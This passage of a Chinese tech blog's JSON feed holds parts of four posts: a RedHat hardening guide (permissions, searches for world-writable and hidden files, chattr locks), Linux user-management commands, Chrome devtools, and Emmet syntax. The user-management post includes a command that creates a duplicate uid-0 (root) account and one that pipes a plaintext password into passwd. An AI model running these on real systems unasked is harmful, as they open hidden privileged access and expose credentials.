<code>“PATH＝……”</code> 这句中删除</p>\n<ul>\n<li><code>-002</code> 表示任何目录或文件, 只要带 <code>o+w</code> 就匹配</li>\n<li><code>+002</code> 表示目录或文件只有 <code>o+w</code> 权限, 即 <code>-------w-</code> 可能会出现报错提示 <code>/root/bin</code> 目录不存在, <code>PATH</code> 里有该路径, 而实际上没有, 可以先在 <code>/root</code> 下建立一个 <code>bin</code> 目录</li>\n</ul>\n<h2 id=\"远程连接的安全性配置\" tabindex=\"-1\"> 远程连接的安全性配置</h2>\n<p>主要查找系统中是否含有 <code>.netrc</code> 和 <code>.rhosts</code> 文件, 如无必要, 删除这两个文件, <code>For Exmaple:</code></p>\n<div><pre><code><span>find</span> / -name .netrc\n<span>find</span> / -name .rhosts\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"重要目录和文件的权限设置\" tabindex=\"-1\"> 重要目录和文件的权限设置</h2>\n<p>执行以下命令检查目录和文件的权限设置情况</p>\n<div><pre><code><span>ls</span> -l /etc/\n<span>ls</span> -l /etc/rc.d/init.d/\n<span>ls</span> -l /tmp\n<span>ls</span> -l /etc/inetd.conf\n<span>ls</span> -l /etc/passwd\n<span>ls</span> -l /etc/shadow\n<span>ls</span> -l /etc/group\n<span>ls</span> -l /etc/security\n<span>ls</span> -l /etc/services\n<span>ls</span> -l /etc/rc*.d\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>对于重要目录, 建议执行如下类似操作, <code>For Exmaple:</code></p>\n<div><pre><code><span>chmod</span> -R <span>750</span> /etc/rc.d/init.d/*\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>这样只有 root 可以读、写和执行, 编写脚本一次性执行, <code>For Exmaple:</code></p>\n<div><pre><code><span>chmod</span> <span>644</span> /etc/passwd\n<span>chmod</span> <span>600</span> /etc/shadow\n<span>chmod</span> <span>644</span> /etc/group\n<span>chmod</span> <span>600</span> /etc/gshadow\n<span>chmod</span> <span>700</span> /bin/rpm\n<span>chmod</span> <span>644</span> /usr/bin/xhost\n<span>chmod</span> <span>664</span> /etc/hosts\n<span>chmod</span> <span>644</span> /etc/exports\n<span>chmod</span> <span>644</span> /etc/issue\n<span>chmod</span> <span>664</span> /var/log/wtmp\n<span>chmod</span> <span>644</span> /etc/services\n<span>chmod</span> <span>600</span>  /etc/xinetd.conf\n<span>chmod</span> <span>600</span> /etc/login.defs\n<span>chmod</span> <span>600</span> /etc/hosts.allow\n<span>chmod</span> <span>600</span> /etc/hosts.deny\n<span>chmod</span> <span>600</span> /etc/securetty\n<span>chmod</span> <span>600</span> /etc/ssh/ssh_host_key\n<span>chmod</span> <span>600</span> /etc/ssh/sshd_config\n<span>chmod</span> <span>600</span> /var/log/lastlog\n<span>chmod</span> <span>600</span> /var/log/messages\n<span>chmod</span> <span>600</span> /etc/security\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>注意影响</p>\n<p>有的移动安全加固标准要求/etc 目录是 750 权限, 但如果/etc 目录是权限是 750（drwxr-x---）的话, 由于其他组没有 x 权限, 那么普通用户就无权访问/etc 目录以及以下所有文件, 用户获取不到基本的环境变量/etc/profile 和/etc/passwd、group 等文件, 一些基本命令都会出现问题, 本用户的文件只有 uid、gid, 无法对应名用户名称和组名称。</p>\n</div>\n<h2 id=\"检查任何人都有写权限的目录\" tabindex=\"-1\"> 检查任何人都有写权限的目录</h2>\n<p><code>For Exmaple:</code></p>\n<div><pre><code><span>find</span> / -type d -perm -0222 -exec <span>ls</span> -ldg <span>{</span><span>}</span> <span>\\</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>提示</p>\n<p>这些目录是存放每个用户临时文件的, 目录本身是带 <code>Sticky BIT</code> 粘滞位的, 即使里面的文件有 <code>o+w</code> 权限也没问题, 系统本身有保护性措施。</p>\n</div>\n<h2 id=\"查找任何人都有写权限的文件\" tabindex=\"-1\"> 查找任何人都有写权限的文件</h2>\n<p><code>For Exmaple:</code></p>\n<div><pre><code><span>find</span> / -type f -perm -0222 -exec <span>ls</span> -lg <span>{</span><span>}</span> <span>\\</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/redhat-reinforce-14.png\" alt=\"RedHat 安全加固\"></p>\n<h2 id=\"检查没有属主的文件\" tabindex=\"-1\"> 检查没有属主的文件</h2>\n<p><code>For Exmaple:</code></p>\n<div><pre><code><span>find</span> / -nouser -o -nogroup -print\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>发现没有属主的文件往往就意味着有黑客入侵你的系统了。不能允许没有主 人的文件存在。如果在系统中发现了没有属主的文件或目录, 先查看它的完 整性, 如果一切正常, 给它一个属主。有时候卸载程序可能会出现一些没有 主人的文件或目录, 在这种情况下可以把这些文件和目录删除掉。</p>\n<p>在安全加固脚本中, 把没有属主或属组的文件直接赋予了 <code>nobody</code> 用户和组, <code>For Exmaple:</code></p>\n<div><pre><code><span>find</span> / -path <span>\"/proc\"</span> -prune -nouser -o -nogroup -exec <span>chown</span> nobody:nobody <span>{</span><span>}</span> <span>\\</span><span>;</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>提示</p>\n<p>命令中排除了 /proc 目录</p>\n</div>\n<h2 id=\"检查异常隐含文件\" tabindex=\"-1\"> 检查异常隐含文件</h2>\n<p><code>For Exmaple:</code></p>\n<div><pre><code><span>find</span> / -xdev -name <span>\"..*\"</span> -print\n<span>find</span> / -xdev -name <span>\"...*\"</span> -print\n<span>find</span> / -xdev -name <span>\"..^G\"</span> -print\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>同时也要注意象 <code>“.xx”</code> 和 <code>“.mail”</code> 这样的文件名的。（这些文件名看起来都很象正常的文件名）在系统的每个地方都要查看一下有没有异常隐含文件（点号是起始字符的, 用 <code>“ls”</code> 命令看不到的文件）, 因为这些文件可能是隐藏的黑客工具或者其它一些信息（口令破解程序、其它系统的口令文件, 等等）。在 <code>UNIX</code> 下, 一个常用的技术就是用一些特殊的名, 如: <code>“...”</code> 、 <code>“.. ”（点点空格</code> ）或 <code>“..^G”（点点 ctrl+v 和 ctrl+G）</code> , 来隐含文件或目录。</p>\n<p>基本上系统默认只有一个文件 <code>/usr/share/man/man1/..1.gz</code> , 在加固脚本中的处理方式是存在就直接把它删除掉。<br></p>\n<p><img src=\"/assets/redhat-reinforce-15.png\" alt=\"RedHat 安全加固\"></p>\n<h2 id=\"加锁重要口令文件和组文件\" tabindex=\"-1\"> 加锁重要口令文件和组文件</h2>\n<p>可以用下面的命令给口令文件和组文件设置不可改变位加锁, <code>For Exmaple:</code></p>\n<div><pre><code>chattr +i /etc/passwd\nchattr +i /etc/shadow\nchattr +i /etc/group\nchattr +i /etc/gshadow\nchattr +i /etc/xinetd.conf\nchattr +i /etc/services\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>加锁后, 就不能被改变文件内容。同时会影响 <code>useradd</code> 、 <code>userdel</code> 等跟帐户相关的操作</p>\n<p>查看命令, <code>For Exmaple:</code></p>\n<div><pre><code>lsattr /etc/passwd\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>返回结果为: <code>----i-------- /etc/passwd</code> 如果要修改文件, 必须先对该文件进行解锁, <code>For Exmaple:</code></p>\n<div><pre><code>chattr -i /etc/passwd\nchattr -i /etc/shadow\nchattr -i /etc/group\nchattr -i /etc/gshadow\nchattr -i /etc/xinetd.conf\nchattr -i /etc/services\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div>",
      "image": "https://vxhly.github.io/assets/redhat-reinforce-12.png",
      "date_published": "2016-10-14T22:08:33.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "Liunx 学习笔记（六）用户的管理",
      "url": "https://vxhly.github.io/views/liunx/user-management.html",
      "id": "https://vxhly.github.io/views/liunx/user-management.html",
      "summary": "前言\n本篇是 Liunx 的学习笔记系列第五篇, 这一篇将介绍 Liunx 下用户的管理。用户管理看似很简单, 但是里面还隐藏着大学问呢。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本篇是 Liunx 的学习笔记系列第五篇, 这一篇将介绍 Liunx 下用户的管理。用户管理看似很简单, 但是里面还隐藏着大学问呢。</p>\n</div>\n\n<h2 id=\"添加用户-并创建用户宿主目录\" tabindex=\"-1\"> 添加用户, 并创建用户宿主目录</h2>\n<p><code>For Example:</code></p>\n<div><pre><code><span>useradd</span> -m <span>[</span>userName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"删除用户-并删除用户宿主目录\" tabindex=\"-1\"> 删除用户, 并删除用户宿主目录</h2>\n<p><code>For Example:</code></p>\n<div><pre><code><span>userdel</span> -r <span>[</span>userName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"添加-uid-为-0-的用户\" tabindex=\"-1\"> 添加 uid 为 0 的用户</h2>\n<p><code>For Example:</code></p>\n<div><pre><code><span>useradd</span> -u <span>0</span> -o <span>[</span>userName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"查看用户的-uid-或-gid-等信息\" tabindex=\"-1\"> 查看用户的 uid 或 gid 等信息</h2>\n<p><code>For Example:</code></p>\n<div><pre><code><span>id</span> <span>[</span>userName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"为用户添加密码\" tabindex=\"-1\"> 为用户添加密码</h2>\n<p><code>For Example:</code></p>\n<div><pre><code><span>passwd</span> <span>[</span>userName<span>]</span>                                   <span># 普通方法</span>\n<span>echo</span> <span>\"passwd string\"</span> <span>|</span> <span>passwd</span> --stdin <span>[</span>userName<span>]</span>    <span># 输出文本内容作为密码</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>普通用户修改密码命令: passwd</p>\n<h2 id=\"查看用户的密码状态\" tabindex=\"-1\"> 查看用户的密码状态</h2>\n<p><code>For Example:</code></p>\n<div><pre><code><span>passwd</span> -S <span>[</span>userName<span>]</span>                      <span># 普通方法</span>\n<span>cat</span> /etc/passwd <span>|</span> <span>grep</span> <span>[</span>userName<span>]</span>         <span># 查看配置文件</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"禁用和解锁用户\" tabindex=\"-1\"> 禁用和解锁用户</h2>\n<h3 id=\"passwd-方法\" tabindex=\"-1\"> passwd 方法</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>passwd</span> -l <span>[</span>userName<span>]</span>    <span># 禁用</span>\n<span>passwd</span> -u <span>[</span>userName<span>]</span>    <span># 解锁</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"修改-etc-shadow-文件-root-用户\" tabindex=\"-1\"> 修改 /etc/shadow 文件（root 用户）</h2>\n<p><code>For Example:</code></p>\n<div><pre><code><span>vim</span> /etc/shadow\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>禁用则在密码位前手工添加 <code>!</code> （启用删除 <code>!</code> 即可）</p>\n<div><pre><code>test:<span>!</span><span>$1</span><span>$afiVSYfG</span><span>$utdc2qWLNrqNcy63Ca8301</span>:16998:0:99999:7:::     <span># 只加一个 ！</span>\ntest:<span>!</span><span>!</span><span>$1</span><span>$afiVSYfG</span><span>$utdc2qWLNrqNcy63Ca8301</span>:16998:0:99999:7:::    <span># 加两个,效果一致</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>使用 <code>:wq!</code> 强制保存, 因为其权限为 <code>000</code></p>\n<h3 id=\"usermod-方法\" tabindex=\"-1\"> usermod 方法</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>usermod</span> -L <span>[</span>userName<span>]</span>    <span># 禁用</span>\n<span>usermod</span> -U <span>[</span>userName<span>]</span>    <span># 解锁</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"设置用户一登录就要修改密码\" tabindex=\"-1\"> 设置用户一登录就要修改密码</h2>\n<p><code>For Example:</code></p>\n<div><pre><code>chage -d <span>0</span> <span>[</span>userName<span>]</span>\n<span># 这个命令其实是把密码修改日期归 0 了 （/etc/shadow 文件第 3 个字段）</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"查看当前登录的用户是谁\" tabindex=\"-1\"> 查看当前登录的用户是谁</h2>\n<p><code>For Example:</code></p>\n<div><pre><code><span>whoami</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"查看当前登录的用户的环境变量\" tabindex=\"-1\"> 查看当前登录的用户的环境变量</h2>\n<p><code>For Example:</code></p>\n<div><pre><code><span>env</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"切换用户\" tabindex=\"-1\"> 切换用户</h2>\n<p><code>For Example:</code></p>\n<div><pre><code><span>su</span> - <span>[</span>userName<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div>",
      "date_published": "2016-10-07T11:31:32.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "关于 Chrome 浏览器的调试方法",
      "url": "https://vxhly.github.io/views/manual/debug-for-chrome-browser.html",
      "id": "https://vxhly.github.io/views/manual/debug-for-chrome-browser.html",
      "summary": "前言\n作为前端开发人员, 最佳的调试环境便是浏览器自带的开发者工具, 此文则介绍 Chrome 浏览器的开发者工具的使用方法。\n\n",
      "content_html": "<div><p>前言</p>\n<p>作为前端开发人员, 最佳的调试环境便是浏览器自带的开发者工具, 此文则介绍 Chrome 浏览器的开发者工具的使用方法。</p>\n</div>\n\n<h2 id=\"chrome-浏览器调试窗口中常用的标签页\" tabindex=\"-1\"> Chrome 浏览器调试窗口中常用的标签页</h2>\n<ul>\n<li><strong>Elements</strong>: 用于查看页面 <code>html</code> 代码</li>\n<li><strong>NetWork</strong>: 用于查看页面的网络请求</li>\n<li><strong>Sources</strong>: 用于查看页面所加载的源文件</li>\n<li><strong>Timeline</strong>: 用于查看页面加载 <code>JavaScript</code> 、页面元素渲染等的时间</li>\n<li><strong>Profiles</strong>: 用于做性能优化的, 包括查看 CPU 执行时间与内存占用</li>\n<li><strong>Resource</strong>s: 用于查看保存再本地的一些信息, 比如 <code>cookie</code> 等</li>\n<li><strong>Audits</strong>: 一般用于优化前端页面、加速网页加载速度</li>\n<li><strong>Console</strong>: <code>JavaScript</code> 控制台, 这个面板可以查看错误信息、打印调试信息、写一些测试脚本, 还可以当作 <code>JavaScript API</code> 查看用。</li>\n</ul>\n<p>Chrome 浏览器不仅可以调试页面、 JavaScript、请求、资源、 cookie, 还可以模拟手机进行调试</p>\n<h2 id=\"打开调试方法\" tabindex=\"-1\"> 打开调试方法</h2>\n<h3 id=\"方法一\" tabindex=\"-1\"> 方法一</h3>\n<p>直接在页面上点击右键, 然后选择审查元素</p>\n<p><img src=\"/assets/open-browser-debug-1.png\" alt=\"打开调试方法\"></p>\n<h3 id=\"方法二\" tabindex=\"-1\"> 方法二</h3>\n<p>在 Chrome 的工具中找到开发者工具</p>\n<p><img src=\"/assets/open-broswer-debug-2.png\" alt=\"打开调试方法\"></p>\n<h4 id=\"方法三\" tabindex=\"-1\"> 方法三</h4>\n<p>使用快捷键 Ctrl+Shift+I (或者 Ctrl+Shift+J 直接打开控制台), 或者直接按 F12</p>\n<p><img src=\"/assets/open-browser-debug-3.png\" alt=\"打开调试方法\"></p>\n<h3 id=\"elements-标签页\" tabindex=\"-1\"> Elements 标签页</h3>\n<p>Elements 标签页的左侧就是对页面 HTML 结构的查看与编辑, 你可以直接在某个元素上双击修改元素的属性。</p>\n<p><img src=\"/assets/broswer-debug-elements-1.png\" alt=\"Elements 标签页\"></p>\n<ul>\n<li><strong>Add attribute</strong>: 向该元素添加其他的属性</li>\n<li><strong>Edit as HTML</strong>: 直接对元素的 <code>HTML</code> 进行编辑, 或者删除某个元素, 所有的修改都会即时在页面上得到呈现。</li>\n<li><strong>Copy</strong>: 可以将 <code>HTML</code> 代码直接复制下来, 在拷贝别人网站上面的 <code>HTML</code> 代码的时候灰常方便, 你懂的~~</li>\n<li><strong>Hide element</strong>: 隐藏该元素</li>\n<li><strong>Delete element</strong>: 删掉该元素</li>\n<li><strong>Scroll into view</strong>: 视图滚动到选择的位置</li>\n<li><strong>Break on</strong>: 可以对某个元素进行监听, 在 <code>JavaScript</code> 中对元素的属性或者 <code>HTML</code> 进行修改的时候, 直接触发断点, 跳转到对改元素进行修改的 <code>JavaScript</code> 代码处</li>\n</ul>\n<p>Elements 标签页的右侧可以对元素的 CSS 进行查看与编辑修改</p>\n<p><img src=\"/assets/broswer-debug-elements-2.png\" alt=\"Elements 标签页\"></p>\n<ul>\n<li><strong>Styles</strong>: 看 <code>HTML</code> 元素的样式</li>\n<li><strong>Computed</strong>: 可以看元素的盒子模型</li>\n<li><strong>Event Listeners</strong>: 对元素的监听方法将会显示在这里</li>\n<li><strong>DOM Breakpoints</strong>: <code>DOM</code> 树的断点调试, （通过右键某一个元素, 依次选择 <code>Break on</code> , 选择 <code>Attributes modifications</code> ）, 设置后刷新页面, 当元素的属性发生改变时, 暂停脚本并定位到该位置</li>\n<li><strong>Properties</strong>: 可以查看到元素具有的方法与属性, 比查 <code>API</code> 手册要方便得多</li>\n</ul>\n<h2 id=\"network-标签页\" tabindex=\"-1\"> Network 标签页</h2>\n<p>Network 标签页对于分析网站请求的网络情况、查看某一请求的请求头和响应头还有响应内容很有用。 注意是在你打开 Chrome 开发者工具后发起的请求, 才会在这里显示的哦。</p>\n<p><img src=\"/assets/browser-debug-network-1.png\" alt=\"Network 标签页\"></p>\n<p>点击左侧某一个具体请求 URL, 可以看到该请求的详细 HTTP 请求情况</p>\n<p><img src=\"/assets/browser-debug-network-2.png\" alt=\"Network 标签页\"></p>\n<p>我们可以在这里看到 <code>HTTP 请求头</code> 、 <code>HTTP 响应头</code> 、 <code>HTTP 返回的内容</code> 等信息。</p>\n<ul>\n<li><strong>Headers</strong>: 请求头信息和响应头信息</li>\n<li><strong>Preview</strong>: 预览结果, 如果是文件可以查看这个文件；如果是图片可以预览这个图片；如果是从服务器返回来的 <code>JSON</code> 数据, 可以查看格式话后的 <code>JSON</code></li>\n<li><strong>Response</strong>: 从服务器返回的响应结果</li>\n<li><strong>Cookies</strong>: 请求和响应的 <code>Cookie</code></li>\n<li><strong>Timing</strong>: 具体的响应时间</li>\n</ul>\n<p><img src=\"/assets/browser-debug-network-4.png\" alt=\"Network 标签页\"></p>\n<br>\n<p><img src=\"/assets/browser-debug-network-5.png\" alt=\"Network 标签页\"></p>\n<br>\n<p><img src=\"/assets/browser-debug-network-6.png\" alt=\"Network 标签页\"></p>\n<h2 id=\"sources-标签页\" tabindex=\"-1\"> Sources 标签页</h2>\n<p>Sources 标签页可以查看到请求的资源情况, 包括 CSS、 JavaScript、图片等的内容。也可以设置各种断点。对存储的内容进行编辑然后保存也会实时的反应到页面上。</p>\n<p><img src=\"/assets/browser-debug-sources-1.png\" alt=\"Sources 标签页\"></p>\n<h2 id=\"audits-标签页\" tabindex=\"-1\"> Audits 标签页</h2>\n<p>这个对于优化前端页面、加速网页加载速度很有用哦。（相当与 Yslow）</p>\n<p><img src=\"/assets/browser-debug-audits-3.png\" alt=\"Audits 标签页\"></p>\n<h2 id=\"console-标签页\" tabindex=\"-1\"> Console 标签页</h2>\n<p>JavaScript 控制台, 前端开发人员最经常使用它来调试 js 的错误。</p>\n<p><img src=\"/assets/browser-debug-console-1.png\" alt=\"Console 标签页\"></p>\n<br>\n<p><img src=\"/assets/browser-debug-console-2.png\" alt=\"Console 标签页\"></p>\n<h2 id=\"移动端开发调试\" tabindex=\"-1\"> 移动端开发调试</h2>\n<p>可以模拟出不同分辨率的移动端显示的效果, 此效果仅供参考, 因为还有可能受浏览器的不同而显示效果不同。</p>\n<p><img src=\"/assets/browser-debug-moblie-1.png\" alt=\"移动端开发调试\"></p>\n<br>\n<p><img src=\"/assets/browser-debug-moblie-2.png\" alt=\"移动端开发调试\"></p>\n",
      "image": "https://vxhly.github.io/assets/open-browser-debug-1.png",
      "date_published": "2016-08-05T18:24:29.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "manual"
      ]
    },
    {
      "title": "Emmet 用法举例",
      "url": "https://vxhly.github.io/views/manual/emmet-usage-examples.html",
      "id": "https://vxhly.github.io/views/manual/emmet-usage-examples.html",
      "summary": "前言\nEmmet 的前身是大名鼎鼎的 Zen coding。如果你从事 Web 前端开发的话, 对该插件一定不会陌生。它使用仿 CSS 选择器的语法来代码, 大大提高了 HTML/CSS 代码编写的速度。\n\n",
      "content_html": "<div><p>前言</p>\n<p>Emmet 的前身是大名鼎鼎的 Zen coding。如果你从事 Web 前端开发的话, 对该插件一定不会陌生。它使用仿 CSS 选择器的语法来代码, 大大提高了 HTML/CSS 代码编写的速度。</p>\n</div>\n\n<h2 id=\"子元素\" tabindex=\"-1\"> 子元素: &gt;</h2>\n<h3 id=\"例子\" tabindex=\"-1\"> 例子</h3>\n<p><code>nav&gt;ul&gt;li</code></p>\n<div><pre><code><span><span><span>&lt;</span>nav</span><span>></span></span>\n  <span><span><span>&lt;</span>ul</span><span>></span></span>\n    <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;/</span>ul</span><span>></span></span>\n<span><span><span>&lt;/</span>nav</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"兄弟元素\" tabindex=\"-1\"> 兄弟元素: +</h2>\n<h3 id=\"例子-1\" tabindex=\"-1\"> 例子</h3>\n<p><code>div+p+bq</code></p>\n<div><pre><code><span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>\n<span><span><span>&lt;</span>p</span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>\n<span><span><span>&lt;</span>blockquote</span><span>></span></span><span><span><span>&lt;/</span>blockquote</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h2 id=\"在某个元素之上\" tabindex=\"-1\"> 在某个元素之上: ^</h2>\n<h3 id=\"例子一\" tabindex=\"-1\"> 例子一</h3>\n<p><code>div+div&gt;p&gt;span+em^bq</code></p>\n<div><pre><code><span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>\n<span><span><span>&lt;</span>div</span><span>></span></span>\n  <span><span><span>&lt;</span>p</span><span>></span></span><span><span><span>&lt;</span>span</span><span>></span></span><span><span><span>&lt;/</span>span</span><span>></span></span><span><span><span>&lt;</span>em</span><span>></span></span><span><span><span>&lt;/</span>em</span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>\n  <span><span><span>&lt;</span>blockquote</span><span>></span></span><span><span><span>&lt;/</span>blockquote</span><span>></span></span>\n<span><span><span>&lt;/</span>div</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"例子二\" tabindex=\"-1\"> 例子二</h3>\n<p><code>div+div&gt;p&gt;span+em^^bq</code></p>\n<div><pre><code><span><span><span>&lt;</span>div</span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>\n<span><span><span>&lt;</span>div</span><span>></span></span>\n  <span><span><span>&lt;</span>p</span><span>></span></span><span><span><span>&lt;</span>span</span><span>></span></span><span><span><span>&lt;/</span>span</span><span>></span></span><span><span><span>&lt;</span>em</span><span>></span></span><span><span><span>&lt;/</span>em</span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>\n<span><span><span>&lt;/</span>div</span><span>></span></span>\n<span><span><span>&lt;</span>blockquote</span><span>></span></span><span><span><span>&lt;/</span>blockquote</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"分为一组\" tabindex=\"-1\"> 分为一组: ()</h2>\n<h3 id=\"例子一-1\" tabindex=\"-1\"> 例子一</h3>\n<p><code>div&gt;(header&gt;ul&gt;li*2&gt;a)+footer&gt;p</code></p>\n<div><pre><code><span><span><span>&lt;</span>div</span><span>></span></span>\n  <span><span><span>&lt;</span>header</span><span>></span></span>\n    <span><span><span>&lt;</span>ul</span><span>></span></span>\n      <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>\"</span><span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>a</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n      <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;</span>a</span> <span>href</span><span><span>=</span><span>\"</span><span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>a</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n    <span><span><span>&lt;/</span>ul</span><span>></span></span>\n  <span><span><span>&lt;/</span>header</span><span>></span></span>\n  <span><span><span>&lt;</span>footer</span><span>></span></span>\n    <span><span><span>&lt;</span>p</span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>\n  <span><span><span>&lt;/</span>footer</span><span>></span></span>\n<span><span><span>&lt;/</span>div</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"例子二-1\" tabindex=\"-1\"> 例子二</h3>\n<p><code>(div&gt;dl&gt;(dt+dd)*3)+footer&gt;p</code></p>\n<div><pre><code><span><span><span>&lt;</span>div</span><span>></span></span>\n  <span><span><span>&lt;</span>dl</span><span>></span></span>\n    <span><span><span>&lt;</span>dt</span><span>></span></span><span><span><span>&lt;/</span>dt</span><span>></span></span>\n    <span><span><span>&lt;</span>dd</span><span>></span></span><span><span><span>&lt;/</span>dd</span><span>></span></span>\n    <span><span><span>&lt;</span>dt</span><span>></span></span><span><span><span>&lt;/</span>dt</span><span>></span></span>\n    <span><span><span>&lt;</span>dd</span><span>></span></span><span><span><span>&lt;/</span>dd</span><span>></span></span>\n    <span><span><span>&lt;</span>dt</span><span>></span></span><span><span><span>&lt;/</span>dt</span><span>></span></span>\n    <span><span><span>&lt;</span>dd</span><span>></span></span><span><span><span>&lt;/</span>dd</span><span>></span></span>\n  <span><span><span>&lt;/</span>dl</span><span>></span></span>\n<span><span><span>&lt;/</span>div</span><span>></span></span>\n<span><span><span>&lt;</span>footer</span><span>></span></span>\n  <span><span><span>&lt;</span>p</span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>\n<span><span><span>&lt;/</span>footer</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"倍增元素\" tabindex=\"-1\"> 倍增元素: *</h2>\n<h3 id=\"例子-2\" tabindex=\"-1\"> 例子</h3>\n<p><code>ul&gt;li*5</code></p>\n<div><pre><code><span><span><span>&lt;</span>ul</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n<span><span><span>&lt;/</span>ul</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"项目数字递增\" tabindex=\"-1\"> 项目数字递增: $</h2>\n<h3 id=\"例子一-2\" tabindex=\"-1\"> 例子一</h3>\n<p><code>ul&gt;li.item$*5</code></p>\n<div><pre><code><span><span><span>&lt;</span>ul</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item1<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item2<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item3<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item4<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n  <span><span><span>&lt;</span>li</span> <span>class</span><span><span>=</span><span>\"</span>item5<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>li</span><span>></span></span>\n<span><span><span>&lt;/</span>ul</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"例子二-2\" tabindex=\"-1\"> 例子二</h3>\n<p><code>h$[title=item$]{Header 